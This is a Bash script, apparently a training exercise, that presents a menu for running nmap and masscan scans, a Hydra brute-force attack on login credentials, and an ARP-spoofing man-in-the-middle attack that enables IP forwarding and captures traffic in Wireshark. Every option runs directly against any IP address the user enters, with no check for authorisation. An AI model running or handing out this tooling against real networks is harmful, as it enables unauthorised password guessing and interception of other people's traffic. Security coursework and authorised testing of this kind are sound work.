#!/bin/bash

# Summary
# 1. Download relevent apps 
# 2. Execute scans and attacks (2 each)
# 3. Log executed scans/attacks

# Step 1. All apps pre-installed. So just update and upgrade

figlet Hello!

function update ()
{ 
	echo "Beginning update & upgrade"
	sudo apt-get update 
	sudo apt-get upgrade
	echo "Systems are updated. You are ready to begin."
}

# Step 2 & 3. Let user decide to execute scans/attack. (2 each). Log each tasks.

function s/a ()

{
	read -p "Choose from the following to proceed scans or attacks - a)Nmap or b)Masscan or c)Hydra or d)MITM .. e)To exit: " choose 
	case $choose in
	
		a)
			figlet NMAP
			echo "You have chosen Nmap..." 
			echo "Enter IP address for Nmap: "
			read IP
			
			echo "Performing Nmap..."
			
			nmap "$IP" --open -oN nmap.txt
			echo "Result saved as nmap.txt"
		
		s/a
		;;
				
		b)
			figlet MASSCAN
			echo "You have chosen Masscan..."
			echo "Enter IP address for Masscan: "
			read IP
			
			echo "Enter Port number: " 
			read Port
			
			echo "Performing Masscan..."
			
			sudo masscan "$IP" -p"$Port" -oG masscan.txt
			echo "Result saved as masscan.txt"
			
		s/a
		;;
		
		c)
			figlet HYDRA
			echo "You have chosen Hydra..."
			echo "Login list for Hydra: "
			read Login
			
			echo "Pass list for Hydra: "
			read Pass
			
			echo "IP server for Hydra: "
			read IP
			
			echo "Type of service for Hydra: "
			read Type
			
			echo "Performing Hydra..."
			
			hydra -L "$Login" -P "$Pass" "$IP" "$Type" -vV -o hydraresult.txt
			echo "Result saved as hydraresult.txt"
		
		s/a
		;;
		
		d)	
			figlet MITM
			echo "You have chosen MITM..."
			sudo sysctl net.ipv4.ip_forward=1

			echo "Enter Default gateway for spoofing: "
			read Gateway
			
			echo "Enter Target address: "
			read Target

			echo "The Gateway is $Gateway.. The Target is $Target.."
			echo "Performing MITM attack... " 
			
			xterm -e sudo arpspoof -t "$Gateway" "$Target" &
			sudo arpspoof -t "$Target" "$Gateway" & 
			wireshark &
			
		;;
		
		e)
			exit
			
	esac	
}	

update
s/a
figlet Goodbye..
